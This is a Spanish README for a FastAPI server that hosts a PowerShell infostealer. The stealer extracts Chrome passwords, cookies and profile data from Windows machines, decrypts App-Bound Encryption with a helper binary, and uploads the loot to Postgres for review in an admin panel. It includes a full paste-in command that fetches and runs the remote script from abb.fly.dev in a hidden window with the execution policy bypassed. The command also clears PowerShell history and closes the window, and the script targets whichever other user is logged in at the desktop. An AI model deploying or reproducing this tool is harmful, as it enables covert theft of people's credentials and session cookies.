# remote-scripts

API en FastAPI que sirve un script de PowerShell para Windows, recibe exports de Chrome (passwords, cookies, metadata) y los guarda en Postgres. Incluye un panel admin opcional para revisar registros.

## Flujo general

```
Windows (PowerShell)
  │
  ├─ GET  /wscp          → descarga windows_script.ps1 (con __API_BASE__ inyectado)
  ├─ GET  /chrmlvtr      → descarga chromelevator (Chrome 127+, App-Bound Encryption)
  │
  ├─ Lee Chrome User Data del usuario objetivo
  ├─ Export C# embebido  → passwords/cookies desde SQLite
  ├─ chromelevator       → descifrado ABE (cookies + merge de passwords)
  │
  └─ POST /p             → payload JSON en base64 → Postgres

Errores del script → POST /e (base64 JSON)
```

El script corre **en la máquina Windows del usuario**. El servidor solo aloja el script, recibe datos y los persiste.

## Endpoints principales

| Ruta | Método | Uso |
|------|--------|-----|
| `/wscp` | GET | Script PowerShell. Query: `?debug=1`, `?close=1` |
| `/c` | GET | Página HTML para copiar el comando `iex ...` |
| `/p` | POST | Body: JSON del payload en **base64** (text/plain) |
| `/e` | POST | Body: reporte de error en **base64** |
| `/chrmlvtr?arch=x64` | GET | Binario chromelevator (`x64` o `arm64`) |
| `/admin-credentials/*` | GET | Panel admin (solo si `ENABLED_ADMIN_PANEL=true`) |

Rutas desconocidas responden **404 vacío** (sin detalle).

## Uso en Windows

1. Levantá el servidor (local o Fly).
2. Abrí `https://<host>/c` y usá **Copy** (recomendado), o pegá el comando equivalente:

```powershell
Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-Command','iex (New-Object Net.WebClient).DownloadString(''https://abb.fly.dev/wscp?close=1&hidden=1'')'; ...; exit
```

**Copy** hace todo automático:
- Lanza el script en segundo plano (sin ventana)
- Limpia el historial de PowerShell
- Cierra la ventana donde pegaste el comando (`exit`)
- El proceso oculto se cierra solo al terminar (`close=1`)

Otras opciones en `/c`:
- **Copy visible** — corre en la ventana actual (sin close)
- **Copy with debug** — visible con logs `[DEBUG]` (solo limpia historial al final)

### Qué hace el script

1. **Detecta usuario objetivo** — si PowerShell corre elevado como admin pero hay otro usuario en la sesión de escritorio, usa el perfil de ese usuario (Chrome path + `username` del payload).
2. **Export C#** — recorre perfiles `Default` y `Profile N`, lee `Login Data` (y cookies en Chrome legacy).
3. **chromelevator** (Chrome ≥ 127) — descifra App-Bound Encryption. Si corre como admin, se lanza en una **tarea programada** bajo el usuario interactivo (sin ventana CMD).
4. **Merge** — combina export + metadata de perfiles + salida de chromelevator en un JSON.
5. **Upload** — POST base64 a `/p`.

### Payload (campos útiles)

| Campo | Descripción |
|-------|-------------|
| `hostname` | Nombre de la PC |
| `username` | Usuario Windows objetivo |
| `passwords[]` | URL, username, `password` / `password_dpapi`, `profile` |
| `cookies[]` | host, name, value, `profile` |
| `profiles` | Metadata Chrome (nombre, email por carpeta) |
| `chromelevator` | Si se usó, arch, errores, `runAsInteractiveUser` |

Códigos de error del script: `app/error_codes.json`.

## Desarrollo local

Requisitos: Docker, Postgres (Neon o local).

```bash
docker compose up --build
```

- API: http://localhost:8001
- Comando para copiar: http://localhost:8001/c
- Admin: http://localhost:8001/admin-credentials (si está habilitado)
- Migraciones: Alembic corre al iniciar el contenedor

Variables en `docker-compose.yml`:

| Variable | Default local | Descripción |
|----------|---------------|-------------|
| `DATABASE_URL` | (ver `app/db.py`) | Conexión Postgres |
| `PAYLOAD_HOSTNAME` | `localhost:8001` | Host que se inyecta en el script |
| `ENVIRONMENT` | `local` | Etiqueta en registros (`local` / `production`) |
| `ENABLED_ADMIN_PANEL` | `true` | Habilita rutas `/admin-credentials` |

### chromelevator

Colocá los binarios en `app/bin/`:

```
app/bin/chromelevator_x64.exe
app/bin/chromelevator_arm64.exe
```

Sin ellos, `/chrmlvtr` responde 404 y Chrome 127+ no podrá descifrar ABE.

## Producción (Fly.io)

App: `abb` → https://abb.fly.dev

```bash
fly deploy -a abb
```

`fly.toml` define `ENVIRONMENT=production` y `ENABLED_ADMIN_PANEL=true`.  
`DATABASE_URL` se configura como secret en Fly.

## Panel admin

- URL: `/admin-credentials`
- Auth: HTTP Basic (credenciales en `app/config.py` → `ADMIN_AUTH_USER` / `ADMIN_AUTH_PASSWORD`)
- Solo se monta si `ENABLED_ADMIN_PANEL=true`
- **Records**: listado y detalle por PC, filtros por environment, pestañas por perfil Chrome
- **PCs**: tags por máquina
- **Errors**: errores reportados por el script (`POST /e`)

## Estructura del repo

```
app/
  main.py              # FastAPI, rutas públicas
  windows_script.ps1   # Script Windows (plantilla con placeholders)
  admin.py             # Panel admin
  repository.py        # Persistencia
  models.py            # Payload, Pc, ScriptError
  config.py            # ENVIRONMENT, admin flags
  error_codes.json
  bin/                 # chromelevator (no versionado)
alembic/               # Migraciones
```

## Notas importantes

- **Chrome abierto**: perfiles activos pueden tener `Login Data` bloqueado; el export los omite en silencio. Cerrar Chrome mejora la cobertura multi-perfil.
- **Admin vs usuario de escritorio**: el script resuelve el usuario interactivo; chromelevator corre en su contexto cuando hace falta.
- **Passwords vs cookies (Chrome 127+)**: cookies vienen directo de chromelevator; passwords requieren merge con filas del export — si no matchean URL/username/perfil, `password_dpapi` queda vacío.
- **Seguridad**: cambiá credenciales admin y `DATABASE_URL` antes de exponer públicamente. El servidor no expone OpenAPI ni mensajes de error detallados.
